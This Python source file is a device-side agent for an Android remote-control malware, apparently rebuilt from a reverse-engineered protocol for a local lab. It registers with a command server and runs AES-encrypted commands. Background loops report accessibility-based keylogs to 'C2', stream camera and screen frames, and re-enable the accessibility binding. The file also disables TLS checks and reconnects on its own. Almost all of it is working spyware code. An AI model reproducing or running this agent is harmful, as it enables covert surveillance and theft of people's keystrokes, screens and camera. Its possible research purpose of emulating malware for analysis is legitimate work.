#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""· 设备端 agent（按已测绘协议实现，本地部署样本代码）
流程（与案卷 F-30 一致）：
  1) GET /adv.php?apk=&device=  取加密通道配置
  2) WS  /io/?EIO=3&transport=websocket&apkid=&device=&ver=   engine.io 握手 -> "40"
  3) 上线自报 device_info / adb_status / permissions
  4) 收 "42["new_msg",<AES>]" 指令，按 action 回 "42["enc msg",<AES({"action","type":"enc","data"})>]"
用法: python refagent.py --url http://127.0.0.1:8788 --device <16hex>
"""
import argparse, asyncio, base64, json, os, random, struct, sys, time
from urllib.parse import urlparse, quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import actions
import dispatch

from Crypto.Cipher import AES

KEY = b'0623U25KTT3YO8P9'


def enc(plain: str) -> str:
    raw = plain.encode('utf-8')
    pad = 16 - (len(raw) % 16)
    raw += bytes([pad]) * pad
    return base64.b64encode(AES.new(KEY, AES.MODE_ECB).encrypt(raw)).decode()


def dec(b64: str) -> str:
    out = AES.new(KEY, AES.MODE_ECB).decrypt(base64.b64decode(b64))
    if out:
        p = out[-1]
        if 0 < p <= 16:
            out = out[:-p]
    return out.decode('utf-8', 'replace')


def dev_info(dev):
    """设备自报字段（键名对齐原版面板读取的列）。

    **真机上读真值**（getprop/dumpsys//proc），读不到才用这份默认值（非真机演示）。
    之前这里是写死的假值，面板顶部卡片显示的 Android 版本/机型/电量全是编的。
    """
    try:
        import actions as _a
        real = _a.device_info_real(dev)
        if real:
            return real
    except Exception as e:
        print('[agent] 真机信息读取失败，用默认值: %s' % e)
    return {'deviceId': dev, 'brand': 'Android', 'model': 'lab-device', 'android': '?',
            'sdk': 0, 'region': 'CN', 'country': '中国', 'network': '', 'battery': 0,
            'charging': False, 'screen': '亮屏', 'sim': False, 'root': False,
            'accessibility': False, 'resolution': '', 'uptime': 0}


class Agent:
    def __init__(self, base, dev):
        self.base = base.rstrip('/')
        u = urlparse(self.base)
        self.host, self.port = u.hostname, (u.port or 80)
        self.secure = u.scheme == 'https'
        self.dev = dev
        self.no_binary = False
        self.bin = None
        self.pending_screen = []
        self.bin_seq = 0
        self.bin_sent = 0
        self.bin_acked = 0
        self.bin_reader = self.bin_writer = None
        self.reader = self.writer = None
        self.sent = 0
        self.got = 0

    # ---- 极简 WS 客户端（与案卷中 seat 实现同源）----
    def _ssl(self):
        """HTTPS/WSS：演示实例可以起 TLS（原版面板把实时通道写死成 wss://），
        被控端脚本要能跟着上；自签证书用不校验的上下文（仅本地演示）。"""
        if not self.secure:
            return None
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    async def ws_connect(self):
        path = ('/io/?EIO=3&transport=websocket&apkid=10020&line=&cmode=test&device=%s&ver=v4.0'
                % quote(self.dev))
        self.reader, self.writer = await asyncio.open_connection(
            self.host, self.port, ssl=self._ssl(),
            server_hostname=self.host if self.secure else None)
        key = base64.b64encode(os.urandom(16)).decode()
        req = ('GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
               'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nOrigin: %s\r\n\r\n'
               % (path, self.host, self.port, key, self.base))
        self.writer.write(req.encode())
        await self.writer.drain()
        head = b''
        while b'\r\n\r\n' not in head:
            chunk = await self.reader.read(4096)
            if not chunk:
                raise IOError('握手失败')
            head += chunk
        line = head.split(b'\r\n')[0].decode('latin1')
        if '101' not in line:
            raise IOError('未升级: %s' % line)

    async def ws_send(self, data: str):
        data = data.encode()
        mask = os.urandom(4)
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        n = len(payload)
        if n < 126:
            hdr = struct.pack('!BB', 0x81, 0x80 | n)
        elif n < 65536:
            hdr = struct.pack('!BBH', 0x81, 0x80 | 126, n)
        else:
            hdr = struct.pack('!BBQ', 0x81, 0x80 | 127, n)
        self.writer.write(hdr + mask + payload)
        await self.writer.drain()
        self.sent += 1

    async def ws_send_bin(self, payload: bytes):
        """二进制帧（opcode 0x82）走 **二进制通道**（/ws/binary-device）"""
        if self.bin_writer is None:
            raise IOError('二进制通道未连接')
        mask = os.urandom(4)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        n = len(masked)
        if n < 126:
            hdr = struct.pack('!BB', 0x82, 0x80 | n)
        elif n < 65536:
            hdr = struct.pack('!BBH', 0x82, 0x80 | 126, n)
        else:
            hdr = struct.pack('!BBQ', 0x82, 0x80 | 127, n)
        self.bin_writer.write(hdr + mask + masked)
        await self.bin_writer.drain()

    # ---- 二进制协议（与 server 共用 protocol/binary_proto.py）----
    def _bp(self):
        if not hasattr(self, '_bpmod'):
            sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                            '..', 'protocol'))
            import binary_proto
            self._bpmod = binary_proto
        return self._bpmod

    def bin_frame(self, ftype: int, payload: bytes) -> bytes:
        """单帧（无分片）—— 见 protocol/binary_proto.py 的帧结构定义"""
        return self._bp().pack(ftype, payload, seq=self.bin_seq)

    async def bin_send_screen(self, data: bytes):
        """屏幕帧按 16KB 分片发送（首片 START / 末片 END / 逐片 CRC），并等 ack"""
        bp = self._bp()
        frames = bp.chunkify(bp.T_SCREEN, data, seq0=self.bin_seq)
        self.bin_seq += len(frames)
        self.bin_sent += len(frames)
        for f in frames:
            await self.ws_send_bin(f)
        return len(frames)

    async def ws_recv(self):
        h = await self.reader.readexactly(2)
        op = h[0] & 0x0f
        ln = h[1] & 0x7f
        if ln == 126:
            ln = struct.unpack('>H', await self.reader.readexactly(2))[0]
        elif ln == 127:
            ln = struct.unpack('>Q', await self.reader.readexactly(8))[0]
        data = await self.reader.readexactly(ln) if ln else b''
        return op, data

    async def binary_connect(self):
        """连二进制通道 /ws/binary-device?deviceId=（地址来自 native 逆向）"""
        binfo = getattr(self, 'bin', None)
        if binfo is None:
            return False
        self.bin_reader, self.bin_writer = await asyncio.open_connection(
            self.host, self.port, ssl=self._ssl(),
            server_hostname=self.host if self.secure else None)
        key = base64.b64encode(os.urandom(16)).decode()
        path = '/ws/binary-device?deviceId=%s' % quote(self.dev)
        req = ('GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n'
               'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n'
               % (path, self.host, self.port, key))
        self.bin_writer.write(req.encode())
        await self.bin_writer.drain()
        head = b''
        while b'\r\n\r\n' not in head:
            chunk = await self.bin_reader.read(4096)
            if not chunk:
                return False
            head += chunk
        if '101' not in head.split(b'\r\n')[0].decode('latin1'):
            return False
        print('[agent] 二进制通道已连接（/ws/binary-device）')
        return True

    async def bin_send_raw(self, opcode: int, payload: bytes = b''):
        mask = os.urandom(4)
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        n = len(masked)
        if n < 126:
            hdr = struct.pack('!BB', opcode, 0x80 | n)
        elif n < 65536:
            hdr = struct.pack('!BBH', opcode, 0x80 | 126, n)
        else:
            hdr = struct.pack('!BBQ', opcode, 0x80 | 127, n)
        self.bin_writer.write(hdr + mask + masked)
        await self.bin_writer.drain()

    async def bin_recv(self):
        h = await self.bin_reader.readexactly(2)
        op = h[0] & 0x0f
        ln = h[1] & 0x7f
        if ln == 126:
            ln = struct.unpack('>H', await self.bin_reader.readexactly(2))[0]
        elif ln == 127:
            ln = struct.unpack('>Q', await self.bin_reader.readexactly(8))[0]
        data = await self.bin_reader.readexactly(ln) if ln else b''
        return op, data

    async def binary_loop(self):
        """心跳 + 屏幕帧：原版把画面数据放在二进制通道，文本通道只走指令与结构化结果。
        必须持续读：服务端 heartbeat 会发 ping，不回 pong 会被断开（实测踩过）。"""
        try:
            if not await self.binary_connect():
                print('[agent] 二进制通道连接失败（不影响文本通道）')
                return
        except Exception as e:
            print('[agent] 二进制通道异常 %s' % e)
            return

        async def pump():
            bp = self._bp()
            while True:
                op, data = await self.bin_recv()
                if op == 9:                     # ping -> pong
                    await self.bin_send_raw(0x8A, data)
                    continue
                if op == 8:                     # close
                    raise IOError('closed')
                if op == 2:                     # 服务端 ack
                    fr = bp.parse(data)
                    if fr and fr.get('ok') and fr['type'] == bp.T_ACK:
                        self.bin_acked += 1
        task = asyncio.create_task(pump())
        try:
            while True:
                await asyncio.sleep(10)
                await self.ws_send_bin(self._bp().pack(self._bp().T_HEARTBEAT, b'heartbeat',
                                                       seq=self.bin_seq))
                self.bin_seq += 1
                # 屏幕帧：截图类指令后把画面数据经**分片协议**放二进制通道（与原版分工一致）
                if self.pending_screen:
                    payload = self.pending_screen.pop(0)
                    n = await self.bin_send_screen(payload)
                    print('[agent] 二进制通道发出屏幕帧 %d B（%d 片）' % (len(payload), n))
        except Exception as e:
            task.cancel()
            print('[agent] 二进制循环退出: %s: %s' % (type(e).__name__, e))
            return

    async def send_event(self, action, data):
        body = {'action': action, 'type': 'enc', 'data': data}
        await self.ws_send('42' + json.dumps(['enc msg', enc(json.dumps(body, separators=(',', ':')))],
                                             ensure_ascii=False))
        print('[agent] => %s (%d B)' % (action, len(json.dumps(data))))

    def handle(self, plain):
        """163 条指令全部走执行层：结果帧按源码证据（docs 帧字典）构造。
        原版对纯动作指令不回帧；本设备端回 action_result 以便端到端可观测（见 docs/agent_protocol.md）。"""
        try:
            cmd = json.loads(plain)
        except Exception:
            return None
        act = cmd.get('action', '')
        data = cmd.get('data')
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except Exception:
                data = {}
        if not isinstance(data, dict):
            data = {}
        if not data:
            # 兼容平铺式下发（参数直接挂在顶层）——原版两种写法都出现过
            data = {k: v for k, v in cmd.items() if k not in ('action', 'type')}
        if act == 'deviceInfo' or act == 'getDeviceInfo':
            return ('device_info', dev_info(self.dev))
        try:
            out = actions.execute(act, data, self.dev)
        except Exception as e:
            # 单条指令异常不得影响通道（原版同样不因一条指令崩掉）
            print('[agent] !! %s 执行异常: %s' % (act, e))
            return ('action_result', {'type': 'action_result', 'action': act, 'success': False,
                                      'deviceId': self.dev, 'ts': int(time.time() * 1000),
                                      'error': 'exec_error', 'detail': str(e)[:200]})
        if out is None:
            return ('action_result', {'type': 'action_result', 'action': act, 'success': False,
                                      'deviceId': self.dev, 'ts': int(time.time() * 1000),
                                      'error': 'unknown_action',
                                      'known_actions': len(dispatch.ACTION_CATEGORY)})
        # 截图类：画面数据另走二进制通道（原版分工），文本通道只回结构化结果
        if out[0] == 'screenshot':
            try:
                raw = base64.b64decode(out[1].get('img', '') or '')
            except Exception:
                raw = b''
            if raw:
                self.pending_screen.append(raw)
            if raw and out[1].get('real') and len(raw) > 60000:
                # 真机画面只走二进制通道：文本帧再塞一份 base64 等于同一张图传两遍，
                # 实测把设备端主循环拖到 3~5s 一轮，控制指令只能排队（画面与控制相互挤）
                out = (out[0], dict(out[1], img='', imgLen=len(raw),
                                    imgNote='画面见二进制通道 /ws/binary-device'))
        return out

    async def bridge_keylog_loop(self):
        """连设备端能力 APK 的本地桥，收它**主动推**的无障碍文字变化（keylog 事件），
        转成 `cacheData`（k=keylog）上报 C2。

        这条比"轮询 uiautomator"可靠得多：无障碍是事件驱动的，输入一变就来。
        """
        import json as _json
        while True:
            try:
                reader, writer = await asyncio.open_connection('127.0.0.1', 8788)
            except Exception:
                await asyncio.sleep(10)
                continue
            print('[agent] 已连上能力桥，监听键盘事件')
            try:
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=120)
                    if not line:
                        break
                    try:
                        ev = _json.loads(line.decode('utf-8', 'replace'))
                    except Exception:
                        continue
                    if ev.get('event') == 'keylog' and (ev.get('text') or '').strip():
                        ent = [{'ts': int(time.time()), 'pkg': ev.get('pkg') or '',
                                'type': 'text', 'text': str(ev.get('text'))[:200]}]
                        await self.send_event('cacheData', {
                            'deviceId': self.dev, 'k': 'keylog', 'cache': _json.dumps(
                                ent, ensure_ascii=False), 'real': True, 'count': 1,
                            'source': 'accessibility(事件驱动)'})
                        print('[agent] 键盘记录(无障碍) %s' % str(ev.get('text'))[:40])
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                print('[agent] 桥监听异常: %s' % e)
            finally:
                try:
                    writer.close()
                except Exception:
                    pass
            await asyncio.sleep(5)

    async def keylog_loop(self):
        """后台每 25s 试着读一次输入框文字，有变化就推 cacheData（k=keylog）。

        这是原版语义：设备端自己记、自己推。服务端不能用 readKeylog 来拉 ——
        那个名字不在 163 条指令表里，发了只会得到 unknown_action（实测）。
        """
        while True:
            await asyncio.sleep(25)
            try:
                # 必须丢线程：_ui_text_refresh 内部是 subprocess.run（dump 最长 40s），
                # 直接 await 会堵死事件循环 —— 期间设备端不回任何指令（实测表现成"控制间歇失灵"）
                await asyncio.to_thread(actions._ui_text_refresh, True)
                fr = actions.keylog_frame(self.dev)
                if fr:
                    await self.send_event('cacheData', fr)
                    print('[agent] 键盘记录 +%s 条已上报' % fr.get('count'))
            except Exception as e:
                print('[agent] keylog 循环异常: %s' % e)

    async def acc_guard_loop(self):
        """后台看护无障碍绑定：桥在、但服务没连上时自动重挂一次。

        实测事实：`disableAcc`→`enableAcc` 之后 MIUI 有时不把服务挂回去，重装 APK 也会把绑定打掉 ——
        一旦掉了，手势/悬浮窗/图标别名/设备管理员读回会整批失效（扫里成批回落就是这么来的）。
        """
        while True:
            await asyncio.sleep(60)
            try:
                ok, got = await asyncio.to_thread(actions.repair_stack)
                if not ok:
                    print('[agent] 无障碍自愈未成功，enabled=%s' % (got or '')[:120])
            except Exception as e:
                print('[agent] 无障碍看护异常: %s' % e)

    async def cam_loop(self):
        """摄像头推流：面板只在 `action==='camPic'` 的帧上更新画面（bundle 原文），
        所以打开摄像头后必须由设备端持续推 —— 服务端发 `camPic` 是没用的，它不是指令名。"""
        while True:
            await asyncio.sleep(1.2)
            try:
                if not getattr(actions._CAM, 'get', lambda k: None)('on'):
                    continue
                if not self.ws:
                    continue                    # 还没连上：别每 1.2s 刷一行 NoneType 异常
                fr = actions.cam_frame(self.dev)
                if fr:
                    await self.send_event('camPic', fr)
            except Exception as e:
                print('[agent] cam 推流异常: %s' % e)

    async def run(self):
        # 0) 二进制通道（native 逆向出的 wss://<host>/ws/binary-device?deviceId=）
        self.bin = {'ok': False}
        if not self.no_binary:
            asyncio.create_task(self.binary_loop())
        asyncio.create_task(self.cam_loop())
        asyncio.create_task(self.keylog_loop())
        asyncio.create_task(self.bridge_keylog_loop())
        asyncio.create_task(self.acc_guard_loop())
        # 1) 注册
        import http.client
        if self.secure:
            # /adv.php 走 TLS 时要用 HTTPSConnection（HTTPConnection 会在 TLS 握手时被对端直接断开）
            c = http.client.HTTPSConnection(self.host, self.port, timeout=15, context=self._ssl())
        else:
            c = http.client.HTTPConnection(self.host, self.port, timeout=15)
        c.request('GET', '/adv.php?apk=10020&device=%s' % self.dev,
                  headers={'User-Agent': 'okhttp/4.9.0'})
        r = c.getresponse()
        raw = r.read()
        print('[agent] /adv.php HTTP %s len=%d' % (r.status, len(raw)))
        if not raw:
            raise IOError('注册返回空 body（HTTP %s）' % r.status)
        reg = json.loads(raw.decode())
        c.close()
        cfg = json.loads(dec(reg['token']))
        print('[agent] 注册成功 -> %s' % cfg)

        # 2) 通道
        await self.ws_connect()
        await self.ws_send('40')
        print('[agent] WS 已连接')
        # 3) 自报
        await self.send_event('device_info', dev_info(self.dev))
        await self.send_event('adb_status', {'deviceId': self.dev, 'status': 'connected'})
        await self.send_event('permissions', {'deviceId': self.dev,
                                              'granted': ['CAMERA', 'READ_SMS', 'BIND_ACCESSIBILITY_SERVICE']})
        self.got = 3

        while True:
            try:
                op, data = await asyncio.wait_for(self.ws_recv(), timeout=60)
            except asyncio.TimeoutError:
                await self.ws_send('2')
                continue
            if op == 8:
                print('[agent] 服务端关闭')
                return
            txt = data.decode('utf-8', 'replace')
            if txt == '2':
                await self.ws_send('3')
                continue
            if txt.startswith('42["new_msg"'):
                try:
                    plain = dec(json.loads(txt[2:])[1])
                except Exception as e:
                    print('[agent] 解密失败 %s' % e)
                    continue
                self.got += 1
                print('[agent] <<< 指令 %s' % plain)
                resp = self.handle(plain)
                if resp:
                    await self.send_event(*resp)
                # 画面帧**立刻**发：等 10s 心跳才发的话，控制台的实时画面就是 0.1 fps（实测过）
                while self.pending_screen:
                    payload = self.pending_screen.pop(0)
                    n = await self.bin_send_screen(payload)
                    print('[agent] 画面帧已发 %d B（%d 片）' % (len(payload), n))


async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--url', default='http://127.0.0.1:8788')
    ap.add_argument('--device', default=''.join(random.choice('0123456789abcdef') for _ in range(16)))
    ap.add_argument('--no-binary', action='store_true', help='不连 /ws/binary-device 通道')
    ap.add_argument('--retry', type=float, default=5.0, help='断线后重连间隔秒数（0=不重连，一次性跑完就退）')
    a = ap.parse_args()
    ag = Agent(a.url, a.device)
    ag.no_binary = a.no_binary
    print('[agent] device=%s -> %s' % (ag.dev, a.url))

    # 断线自愈：真实被控端（Android native）本身就带重连；服务端重启/网络抖动后应自己回来，
    # 不能靠人去重起 agent（否则"重启服务端 → 设备全掉线不回来"，整机可用性不成立）
    while True:
        try:
            await ag.run()
            reason = '连接正常结束'
        except asyncio.CancelledError:
            raise
        except Exception as e:
            reason = '%s: %s' % (type(e).__name__, e)
            import traceback
            traceback.print_exc()
        if a.retry <= 0:
            print('[agent] %s，--retry=0 不重连，退出' % reason)
            return
        print('[agent] %s，%.1fs 后重连…' % (reason, a.retry))
        await asyncio.sleep(a.retry)
        ag.__init__(a.url, a.device)     # 重建连接状态（buffer/seq 归零）
        ag.no_binary = a.no_binary


if __name__ == '__main__':
    asyncio.run(main())
